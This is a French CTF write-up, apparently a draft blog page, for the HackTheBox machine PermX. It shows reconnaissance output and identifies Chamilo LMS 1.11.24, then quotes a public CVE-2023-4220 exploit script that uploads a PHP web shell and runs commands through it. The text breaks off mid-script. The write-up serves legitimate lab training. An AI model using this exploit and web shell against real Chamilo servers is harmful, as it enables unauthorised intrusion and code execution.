---



# === Archetype writeups – v1 (stable) ===
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

# H1 SEO (via title, pas dans le markdown)
title: "PermX — HTB Easy Writeup & Walkthrough"
linkTitle: "PermX"
slug: "permx"
date: 2026-02-07T15:42:16+01:00
#lastmod: 2026-02-07T15:42:16+01:00
draft: true

# --- PaperMod / navigation ---
type: "writeups"
summary: "PermX (HTB Easy) : de la RCE Chamilo au shell root, avec pivot SSH et escalade via ACL et sudo."
description: "Writeup de PermX (HTB Easy) : RCE sur Chamilo via upload, récupération de configuration.php, réutilisation d’identifiants, puis élévation root via ACL et sudo."
tags: ["HTB Easy","Chamilo","RCE","Web","ACL","Searchsploit"]
categories: ["Mes writeups"]

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "PermX (HTB Easy) : exploitation de Chamilo par upload non restreint, accès utilisateur via réutilisation d’identifiants, puis root via ACL et sudo"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Permx"
  difficulty: "Easy"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web Exploitation","RCE","SSH Pivot","Privilege Escalation","Linux ACL"]
  time_spent: "2h"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true

# --- SEO Reminders (à compléter après création) ---
# 1) Titre :
#    - Doit contenir : Nom Machine + HTB Easy + Writeup
# 2) Description :
#    - Résumé 130–160 caractères
#    - Style “Mix Parfait” : pédagogique + technique
#    - Exemple : "Writeup de <machine> (HTB Easy) : énumération claire, analyse de la vulnérabilité et escalade structurée."
# 3) ALT (image de couverture) :
#    - Mixer vulnérabilité + pédagogie + progression
#    - Exemple : "Machine <machine> HTB Easy vulnérable à <faille>, expliquée étape par étape jusqu'à l'escalade."
# 4) Tags :
#    - Toujours ["Easy"]
#    - Ajouter d'autres selon le thème : ["web","shellshock","heartbleed","enum"]
# 5) Structure :
#    - H1 = titre
#    - Description = meta description + preview social
#    - ALT = SEO image + accessibilité

# --- SEO CHECKLIST (à valider avant publication) ---

# [ ] 1) Titre (title + H1)
#     - Contient : Nom Machine + HTB Easy + Writeup
#     - Unique sur le site
#     - Lisible hors contexte HTB

# [ ] 2) Description (meta)
#     - 130–160 caractères
#     - Pas générique
#     - Ton pédagogique + technique
#     - Exemple :
#       "Writeup de <machine> (HTB Easy) : énumération claire,
#        compréhension de la vulnérabilité et escalade structurée."

# [ ] 3) Image de couverture
#     - Présente (ou fallback)
#     - Nom explicite
#     - Dimensions cohérentes

# [ ] 4) ALT de l’image
#     - Décrit la machine + l’approche
#     - Pédagogique (pas juste technique)
#     - Exemple :
#       "Machine <machine> HTB Easy exploitée étape par étape,
#        de l’énumération à l’escalade de privilèges."

# [ ] 5) Tags
#     - Toujours inclure la difficulté (ex: "Easy")
#     - Ajouter uniquement des tags techniques réels

# [ ] 6) Structure du contenu
#     - Un seul H1
#     - Sections claires et hiérarchisées
#     - Pas de sections SEO artificielles

---

<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Permx> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

PermX est une machine Hack The Box (Easy) où tu obtiens un premier accès grâce à une **RCE sur Chamilo LMS** via un **upload non restreint**.
 Une fois un shell obtenu en `www-data`, tu récupères le fichier `configuration.php` pour extraire des identifiants, puis tu testes leur **réutilisation** afin de passer en **SSH**.
 La dernière étape consiste à exploiter un **script autorisé via sudo** qui applique des **ACL** sur des fichiers, ce qui permet de viser un fichier sensible via un **lien symbolique** et d’atteindre **root**.

---

## Énumération

{{< enum-intro >}}

### Scan initial

Le scan initial TCP complet (`scans_nmap/full_tcp_scan.txt`) te révèle les ports ouverts suivants :


```bash
# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt permx.htb
Warning: 10.129.x.x giving up on port because retransmission cap hit (6).
Nmap scan report for permx.htb (10.129.x.x)
Host is up (0.011s latency).
Not shown: 35037 filtered tcp ports (no-response), 30496 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 74.85 seconds
```

### Scan FTP/SMB (si services détectés)

Après le scan initial, le script enchaîne automatiquement avec une phase d’énumération ciblée **FTP/SMB** si l’un des services suivants est détecté :
- **FTP** sur le port **21**
- **SMB** sur le port **139** et/ou **445**

Tu retrouves les résultats de cette énumération dans le fichier `scans_nmap/enum_ftp_smb_scan.txt`

```bash
# mon-nmap — ENUM FTP / SMB
# Target : permx.htb
# Date   : [date]

Aucun service FTP (21) ni SMB (139/445) détecté.
Ports ouverts détectés : 22,80
```



### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.

Résultat (`scans_nmap/aggressive_vuln_scan.txt`) :

```bash
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour permx.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"22,80" --script="(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "permx.htb"

# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,80 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt permx.htb
Nmap scan report for permx.htb (10.129.x.x)
Host is up (0.44s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   610.20 ms 10.10.x.x
2   618.05 ms permx.htb (10.129.x.x)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 44.64 seconds

```



### Scan ciblé CMS

Vient ensuite le scan ciblé CMS (`scans_nmap/cms_vuln_scan.txt`).

```bash
# Nmap 7.98 scan initiated [date] as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,80 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt permx.htb
Nmap scan report for permx.htb (10.129.x.x)
Host is up (1.5s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
| http-headers: 
|   Date: [date]
|   Server: Apache/2.4.52 (Ubuntu)
|   Last-Modified: Sat, 20 Jan 2024 14:59:26 GMT
|   ETag: "8d56-60f61d7bd0f80"
|   Accept-Ranges: bytes
|   Content-Length: 36182
|   Vary: Accept-Encoding
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: eLEARNING
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; html: 5
|     /css/
|       css: 1
|     /img/
|       jpg: 7
|     /js/
|       js: 1
|     /lib/animate/
|       css: 1
|     /lib/easing/
|       js: 1
|     /lib/owlcarousel/
|       js: 1
|     /lib/waypoints/
|       js: 1
|     /lib/wow/
|       js: 1
|   Longest directory structure:
|     Depth: 2
|     Dir: /lib/animate/
|   Total files found (by extension):
|_    Other: 1; css: 2; html: 5; jpg: 7; js: 5
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at [date] -- 1 IP address (1 host up) scanned in 39.35 seconds
```



### Scan UDP rapide

Le scan UDP rapide (`scans_nmap/udp_vuln_scan.txt`).

```bash
Nmap scan report for permx.htb (10.129.x.x)
Host is up (0.025s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   closed        snmp
162/udp   open|filtered snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   closed        ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp closed        unknown

# Nmap done at [date] -- 1 IP address (1 host up) scanned in 1.72 seconds
```



### Énumération des chemins web
Pour la découverte des chemins web, tu utilises le script dédié {{< script "mon-recoweb" >}}

```bash
mon-recoweb permx.htb

# Résultats dans le répertoire scans_recoweb/
#  - scans_recoweb/RESULTS_SUMMARY.txt     ← vue d’ensemble des découvertes
#  - scans_recoweb/dirb.log
#  - scans_recoweb/dirb_hits.txt
#  - scans_recoweb/ffuf_dirs.txt
#  - scans_recoweb/ffuf_dirs_hits.txt
#  - scans_recoweb/ffuf_files.txt
#  - scans_recoweb/ffuf_files_hits.txt
#  - scans_recoweb/ffuf_dirs.json
#  - scans_recoweb/ffuf_files.json

```

Le fichier RESULTS_SUMMARY.txt te permet alors d’identifier rapidement les chemins découverts, sans avoir à parcourir l’ensemble des logs générés par les outils.

```bash
===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
Script              : mon-recoweb v2.2.0

Cible        : permx.htb
Périmètre    : /
Date début   : [date] 16:16:18

Commandes exécutées (exactes) :

[dirb — découverte initiale]
dirb http://permx.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/dirb.log

[ffuf — énumération des répertoires]
ffuf -u http://permx.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/ffuf_dirs.json 2>&1 | tee scans_recoweb/ffuf_dirs.log

[ffuf — énumération des fichiers]
ffuf -u http://permx.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/ffuf_files.json 2>&1 | tee scans_recoweb/ffuf_files.log

Processus de génération des résultats :
- Les sorties JSON produites par ffuf constituent la source de vérité.
- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
- Les résultats sont normalisés sous la forme :
    http://cible/chemin (CODE:xxx|SIZE:yyy)
- Les chemins sont ensuite classés par type :
    • répertoires (/chemin/)
    • fichiers (/chemin.ext)
- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
  garantissant la reproductibilité complète du scan.

----------------------------------------------------

=== Résultat global (agrégé) ===

http://permx.htb/404.html (CODE:200|SIZE:10428)
http://permx.htb/about.html (CODE:200|SIZE:20542)
http://permx.htb/. (CODE:200|SIZE:36182)
http://permx.htb/contact.html (CODE:200|SIZE:14753)
http://permx.htb/courses.html (CODE:200|SIZE:22993)
http://permx.htb/css/
http://permx.htb/css/ (CODE:301|SIZE:304)
http://permx.htb/.htaccess.bak (CODE:403|SIZE:274)
http://permx.htb/.htaccess (CODE:403|SIZE:274)
http://permx.htb/.htc (CODE:403|SIZE:274)
http://permx.htb/.ht (CODE:403|SIZE:274)
http://permx.htb/.htgroup (CODE:403|SIZE:274)
http://permx.htb/.htm (CODE:403|SIZE:274)
http://permx.htb/.html (CODE:403|SIZE:274)
http://permx.htb/.htpasswd (CODE:403|SIZE:274)
http://permx.htb/.htpasswds (CODE:403|SIZE:274)
http://permx.htb/.htuser (CODE:403|SIZE:274)
http://permx.htb/img/
http://permx.htb/img/ (CODE:301|SIZE:304)
http://permx.htb/index.html (CODE:200|SIZE:36182)
http://permx.htb/js/
http://permx.htb/js/ (CODE:301|SIZE:303)
http://permx.htb/lib/
http://permx.htb/lib/ (CODE:301|SIZE:304)
http://permx.htb/LICENSE.txt (CODE:200|SIZE:1422)
http://permx.htb/.php (CODE:403|SIZE:274)
http://permx.htb/server-status (CODE:403|SIZE:274)
http://permx.htb/server-status/ (CODE:403|SIZE:274)
http://permx.htb/team.html (CODE:200|SIZE:14806)
http://permx.htb/testimonial.html (CODE:200|SIZE:13018)
http://permx.htb/wp-forum.phps (CODE:403|SIZE:274)

=== Détails par outil ===

[DIRB]
http://permx.htb/css/
http://permx.htb/img/
http://permx.htb/index.html (CODE:200|SIZE:36182)
http://permx.htb/js/
http://permx.htb/lib/
http://permx.htb/server-status (CODE:403|SIZE:274)

[FFUF — DIRECTORIES]
http://permx.htb/css/ (CODE:301|SIZE:304)
http://permx.htb/img/ (CODE:301|SIZE:304)
http://permx.htb/js/ (CODE:301|SIZE:303)
http://permx.htb/lib/ (CODE:301|SIZE:304)
http://permx.htb/server-status/ (CODE:403|SIZE:274)

[FFUF — FILES]
http://permx.htb/404.html (CODE:200|SIZE:10428)
http://permx.htb/about.html (CODE:200|SIZE:20542)
http://permx.htb/. (CODE:200|SIZE:36182)
http://permx.htb/contact.html (CODE:200|SIZE:14753)
http://permx.htb/courses.html (CODE:200|SIZE:22993)
http://permx.htb/.htaccess.bak (CODE:403|SIZE:274)
http://permx.htb/.htaccess (CODE:403|SIZE:274)
http://permx.htb/.htc (CODE:403|SIZE:274)
http://permx.htb/.ht (CODE:403|SIZE:274)
http://permx.htb/.htgroup (CODE:403|SIZE:274)
http://permx.htb/.htm (CODE:403|SIZE:274)
http://permx.htb/.html (CODE:403|SIZE:274)
http://permx.htb/.htpasswd (CODE:403|SIZE:274)
http://permx.htb/.htpasswds (CODE:403|SIZE:274)
http://permx.htb/.htuser (CODE:403|SIZE:274)
http://permx.htb/index.html (CODE:200|SIZE:36182)
http://permx.htb/LICENSE.txt (CODE:200|SIZE:1422)
http://permx.htb/.php (CODE:403|SIZE:274)
http://permx.htb/team.html (CODE:200|SIZE:14806)
http://permx.htb/testimonial.html (CODE:200|SIZE:13018)
http://permx.htb/wp-forum.phps (CODE:403|SIZE:274)

```



### Recherche de vhosts

Enfin, teste rapidement la présence de vhosts  avec  le script {{< script "mon-subdomains" >}}

```bash
mon-subdomains permx.htb

# Résultats dans le répertoire scans_subdomains/
#  - scans_subdomains/scan_vhosts.txt
```

Si aucun vhost distinct n’est détecté, ce fichier te permet malgré tout de confirmer que le fuzzing n’a rien révélé d’exploitable.

```bash
=== mon-subdomains permx.htb START ===
Script       : mon-subdomains
Version      : mon-subdomains 2.0.0
Date         : [date] 16:21:21
Domaine      : permx.htb
IP           : 10.129.x.x
Mode         : large
Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
Codes        : 200,301,302,401,403  (strict=1)

VHOST totaux : 1
  - lms.permx.htb

--- Détails par port ---
Port 80 (http)
  Baseline#1: code=302 size=286 words=26 (Host=5yu6ql290i.permx.htb)
  Baseline#2: code=302 size=286 words=26 (Host=udql2s539y.permx.htb)
  Baseline#3: code=302 size=286 words=26 (Host=szegbbegfm.permx.htb)
  After-redirect#1: code=200 size=36182 words=2466
  After-redirect#2: code=200 size=36182 words=2466
  After-redirect#3: code=200 size=36182 words=2466
  VHOST (1)
    - lms.permx.htb



=== mon-subdomains permx.htb END ===


```



## Prise pied

Les résultats de `mon-nmap` ne révèlent rien d’exploitable au premier coup d’œil : seuls les ports **22 (SSH)** et **80 (HTTP)** sont ouverts, sans vulnérabilité évidente.

En revanche, le script `mon-subdomains` met en évidence le virtual host `lms.permx.htb`.

Plusieurs indices — comme le titre de la page (`eLEARNING`), la présence de pages liées à des cours et le nom même du sous-domaine (`lms`) — indiquent qu’il s’agit d’une application de type *Learning Management System*.

Cette découverte constitue la piste la plus prometteuse pour obtenir un accès initial.

Tu concentres donc ton analyse sur `lms.permx.htb` et tu lances un `mon-recoweb` ciblé afin d’identifier précisément les pages, répertoires et fonctionnalités exploitables.

### Énumération web de lms.permx.htb avec mon-recoweb

Une fois `lms.permx.htb` identifié comme cible prioritaire, tu lances un `mon-recoweb` pour explorer l’application en profondeur. L’objectif est de cartographier sa structure et de repérer rapidement les zones potentiellement exploitables.

```bash
===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
Script              : mon-recoweb v2.2.1

Cible        : lms.permx.htb
Périmètre    : /
Date début   : [date] 17:37:32

Commandes exécutées (exactes) :

[dirb — découverte initiale]
dirb http://lms.permx.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/lms.permx.htb/dirb.log

[ffuf — énumération des répertoires]
ffuf -u http://lms.permx.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/lms.permx.htb/ffuf_dirs.json 2>&1 | tee scans_recoweb/lms.permx.htb/ffuf_dirs.log

[ffuf — énumération des fichiers]
ffuf -u http://lms.permx.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/lms.permx.htb/ffuf_files.json 2>&1 | tee scans_recoweb/lms.permx.htb/ffuf_files.log

Processus de génération des résultats :
- Les sorties JSON produites par ffuf constituent la source de vérité.
- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
- Les résultats sont normalisés sous la forme :
    http://cible/chemin (CODE:xxx|SIZE:yyy)
- Les chemins sont ensuite classés par type :
    • répertoires (/chemin/)
    • fichiers (/chemin.ext)
- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
  garantissant la reproductibilité complète du scan.

----------------------------------------------------

=== Résultat global (agrégé) ===

http://lms.permx.htb/app/
http://lms.permx.htb/app/ (CODE:301|SIZE:312)
http://lms.permx.htb/bin/
http://lms.permx.htb/bin/ (CODE:301|SIZE:312)
http://lms.permx.htb/certificates/
http://lms.permx.htb/certificates/ (CODE:301|SIZE:321)
http://lms.permx.htb/. (CODE:200|SIZE:19348)
http://lms.permx.htb/custompages/ (CODE:301|SIZE:320)
http://lms.permx.htb/documentation/
http://lms.permx.htb/documentation/ (CODE:301|SIZE:322)
http://lms.permx.htb/favicon.ico (CODE:200|SIZE:2462)
http://lms.permx.htb/.htaccess.bak (CODE:403|SIZE:278)
http://lms.permx.htb/.htaccess (CODE:403|SIZE:278)
http://lms.permx.htb/.htc (CODE:403|SIZE:278)
http://lms.permx.htb/.ht (CODE:403|SIZE:278)
http://lms.permx.htb/.htgroup (CODE:403|SIZE:278)
http://lms.permx.htb/.htm (CODE:403|SIZE:278)
http://lms.permx.htb/.html (CODE:403|SIZE:278)
http://lms.permx.htb/.htpasswd (CODE:403|SIZE:278)
http://lms.permx.htb/.htpasswds (CODE:403|SIZE:278)
http://lms.permx.htb/.htuser (CODE:403|SIZE:278)
http://lms.permx.htb/index.php (CODE:200|SIZE:19356)
http://lms.permx.htb/index.php (CODE:200|SIZE:19452)
http://lms.permx.htb/LICENSE (CODE:200|SIZE:35147)
http://lms.permx.htb/LICENSE/ (CODE:200|SIZE:35147)
http://lms.permx.htb/license.txt (CODE:200|SIZE:1614)
http://lms.permx.htb/main/
http://lms.permx.htb/main/ (CODE:301|SIZE:313)
http://lms.permx.htb/news_list.php (CODE:200|SIZE:13995)
http://lms.permx.htb/.php (CODE:403|SIZE:278)
http://lms.permx.htb/plugin/
http://lms.permx.htb/plugin/ (CODE:301|SIZE:315)
http://lms.permx.htb/robots.txt (CODE:200|SIZE:748)
http://lms.permx.htb/server-status (CODE:403|SIZE:278)
http://lms.permx.htb/server-status/ (CODE:403|SIZE:278)
http://lms.permx.htb/src/
http://lms.permx.htb/src/ (CODE:301|SIZE:312)
http://lms.permx.htb/terms.php (CODE:200|SIZE:16127)
http://lms.permx.htb/user.php (CODE:302|SIZE:0)
http://lms.permx.htb/vendor/
http://lms.permx.htb/vendor/ (CODE:301|SIZE:315)
http://lms.permx.htb/web/
http://lms.permx.htb/web/ (CODE:301|SIZE:312)
http://lms.permx.htb/web.config (CODE:200|SIZE:5780)
http://lms.permx.htb/whoisonline.php (CODE:200|SIZE:15471)
http://lms.permx.htb/wp-forum.phps (CODE:403|SIZE:278)

=== Détails par outil ===

[DIRB]
http://lms.permx.htb/app/
http://lms.permx.htb/bin/
http://lms.permx.htb/certificates/
http://lms.permx.htb/documentation/
http://lms.permx.htb/favicon.ico (CODE:200|SIZE:2462)
http://lms.permx.htb/index.php (CODE:200|SIZE:19452)
http://lms.permx.htb/LICENSE (CODE:200|SIZE:35147)
http://lms.permx.htb/main/
http://lms.permx.htb/plugin/
http://lms.permx.htb/robots.txt (CODE:200|SIZE:748)
http://lms.permx.htb/server-status (CODE:403|SIZE:278)
http://lms.permx.htb/src/
http://lms.permx.htb/vendor/
http://lms.permx.htb/web/
http://lms.permx.htb/web.config (CODE:200|SIZE:5780)

[FFUF — DIRECTORIES]
http://lms.permx.htb/app/ (CODE:301|SIZE:312)
http://lms.permx.htb/bin/ (CODE:301|SIZE:312)
http://lms.permx.htb/certificates/ (CODE:301|SIZE:321)
http://lms.permx.htb/custompages/ (CODE:301|SIZE:320)
http://lms.permx.htb/documentation/ (CODE:301|SIZE:322)
http://lms.permx.htb/LICENSE/ (CODE:200|SIZE:35147)
http://lms.permx.htb/main/ (CODE:301|SIZE:313)
http://lms.permx.htb/plugin/ (CODE:301|SIZE:315)
http://lms.permx.htb/server-status/ (CODE:403|SIZE:278)
http://lms.permx.htb/src/ (CODE:301|SIZE:312)
http://lms.permx.htb/vendor/ (CODE:301|SIZE:315)
http://lms.permx.htb/web/ (CODE:301|SIZE:312)

[FFUF — FILES]
http://lms.permx.htb/. (CODE:200|SIZE:19348)
http://lms.permx.htb/favicon.ico (CODE:200|SIZE:2462)
http://lms.permx.htb/.htaccess.bak (CODE:403|SIZE:278)
http://lms.permx.htb/.htaccess (CODE:403|SIZE:278)
http://lms.permx.htb/.htc (CODE:403|SIZE:278)
http://lms.permx.htb/.ht (CODE:403|SIZE:278)
http://lms.permx.htb/.htgroup (CODE:403|SIZE:278)
http://lms.permx.htb/.htm (CODE:403|SIZE:278)
http://lms.permx.htb/.html (CODE:403|SIZE:278)
http://lms.permx.htb/.htpasswd (CODE:403|SIZE:278)
http://lms.permx.htb/.htpasswds (CODE:403|SIZE:278)
http://lms.permx.htb/.htuser (CODE:403|SIZE:278)
http://lms.permx.htb/index.php (CODE:200|SIZE:19356)
http://lms.permx.htb/license.txt (CODE:200|SIZE:1614)
http://lms.permx.htb/news_list.php (CODE:200|SIZE:13995)
http://lms.permx.htb/.php (CODE:403|SIZE:278)
http://lms.permx.htb/robots.txt (CODE:200|SIZE:748)
http://lms.permx.htb/terms.php (CODE:200|SIZE:16127)
http://lms.permx.htb/user.php (CODE:302|SIZE:0)
http://lms.permx.htb/web.config (CODE:200|SIZE:5780)
http://lms.permx.htb/whoisonline.php (CODE:200|SIZE:15471)
http://lms.permx.htb/wp-forum.phps (CODE:403|SIZE:278)
```

À la lecture des résultats de `mon-recoweb`, tu observes une application PHP bien structurée, exposant de nombreux répertoires fonctionnels (`/app`, `/main`, `/plugin`, `/vendor`, `/src`) et plusieurs fichiers accessibles directement depuis le web. 

Ces éléments indiquent la présence d’un LMS (Learning Management System), une application web dédiée à la gestion de formations en ligne (cours, utilisateurs, contenus pédagogiques).

Dans ce type d’environnement, l’exploitation passe généralement par l’analyse des mécanismes d’authentification et des fonctionnalités internes exposées par l’application.

### Identification du LMS et de sa version

Après avoir identifié la structure de l’application via `mon-recoweb`, tu poursuis l’analyse dans le navigateur afin de comprendre plus précisément la technologie utilisée.

L’interface accessible sur `lms.permx.htb` correspond à **Chamilo**, un LMS (*Learning Management System*) open source largement utilisé.



![Page de connexion de Chamilo LMS accessible sans authentification préalable](chamilo-index-login.png)



Les résultats de `mon-recoweb` ont révélé un répertoire `/documentation` accessible.
En y accédant, tu identifies notamment la page `changelog.html`, qui permet de déterminer la version de l’application.



![Changelog officiel de Chamilo indiquant la version 1.11.24 utilisée sur la cible](documentation-changelog.png)

Le changelog te montre que la version utilisée est **Chamilo 1.11.24 (Beersel)**.

Cette information est essentielle, car elle permet de cibler précisément des vulnérabilités connues pour Chamilo 1.11.24.

### Recherche des vulnérabilités

Maintenant que tu as identifié le LMS et sa version (**Chamilo 1.11.24**), tu recherches des vulnérabilités connues à l’aide de `searchsploit`.

```bash
┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/permx]
└─$ searchsploit chamilo 1.11             
------------------------------------ ---------------------------------
 Exploit Title                      |  Path
------------------------------------ ---------------------------------
Chamilo LMS 1.11.14 - Account Takeo | php/webapps/50694.txt
Chamilo LMS 1.11.14 - Remote Code E | php/webapps/49867.py
Chamilo LMS 1.11.24 - Remote Code E | php/webapps/52083.py
Chamilo LMS 1.11.8 - 'firstname' Cr | php/webapps/45536.txt
Chamilo LMS 1.11.8 - Cross-Site Scr | php/webapps/45535.txt
------------------------------------ ---------------------------------
Shellcodes: No Results
```

**La recherche de vulnérabilités avec `searchsploit` met en évidence un exploit de *Remote Code Execution* spécifiquement applicable à *Chamilo 1.11.24*, confirmant l’existence d’une piste d’exploitation directe.**

### Analyse de l’exploit Chamilo 1.11.24

Tu télécharges l’exploit identifié avec `searchsploit -m` afin d’en comprendre le fonctionnement avant de l’utiliser.

```bash
┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/permx]
└─$ searchsploit -m php/webapps/52083.py  
  Exploit: Chamilo LMS 1.11.24 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/52083
     Path: /usr/share/exploitdb/exploits/php/webapps/52083.py
    Codes: CVE-2023-4220
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /mnt/kvm-md0/HTB/permx/52083.py
```

Tu examines ensuite le code de l’exploit pour identifier précisément le mécanisme exploité.

```python
# Exploit Title: Chamilo LMS 1.11.24 - Remote Code Execution (RCE)
# Exploit Author: 0x00-null - Mohamed Kamel BOUZEKRIA
# Exploit Date: September 3, 2024
# Vendor Homepage: https://chamilo.org/
# Software Link: https://chamilo.org/
# Version: 1.11.24 (Beersel)
# Tested Versions: 1.11.24 (Beersel) - August 31, 2023
# CVE ID: CVE-2023-4220
# Vulnerability Type: Remote Code Execution
# Description: Unauthenticated remote code execution in Chamilo LMS <= 1.11.24 due to an unrestricted file upload vulnerability.
# Proof of Concept: Yes
# Categories: Web Application, Remote Code Execution, File Upload
# CVSS Score: 8.1 (High)
# CVSS Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
# Notes: Ensure that the /main/inc/lib/javascript/bigupload/files/ directory exists and is writable.
# License: MIT License
# References:
# - CVE Details: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4220
# - Exploit Documentation: https://github.com/0x00-null/Chamilo-CVE-2023-4220-RCE-Exploit
# - Vendor Advisory: https://chamilo.org/

import requests
import argparse
from urllib.parse import urljoin

def upload_shell(target_url, payload_name):
    upload_url = urljoin(target_url, "main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported")
    shell_path = f"/main/inc/lib/javascript/bigupload/files/{payload_name}"
    shell_url = urljoin(target_url, shell_path)

    # Payload containing the PHP web shell
    files = {'bigUploadFile': (payload_name, '<?php system($_GET["cmd"]); ?>', 'application/x-php')}

    # Upload the payload
    response = requests.post(upload_url, files=files)

    if response.status_code == 200:
        print("[+] File uploaded successfully!")
        print(f"[+] Access the shell at: {shell_url}?cmd=")
    else:
        print("[-] File upload failed.")

def execute_command(shell_url, cmd):
    # Execute the command
    response = requests.get(f"{shell_url}?cmd={cmd}")
    if response.status_code == 200:
        print(f"[+] Command Output:\n{response.text}")
    else:
        print(f"[-] Failed to execute command at {shell_url}")

if __name__ == "__main__":
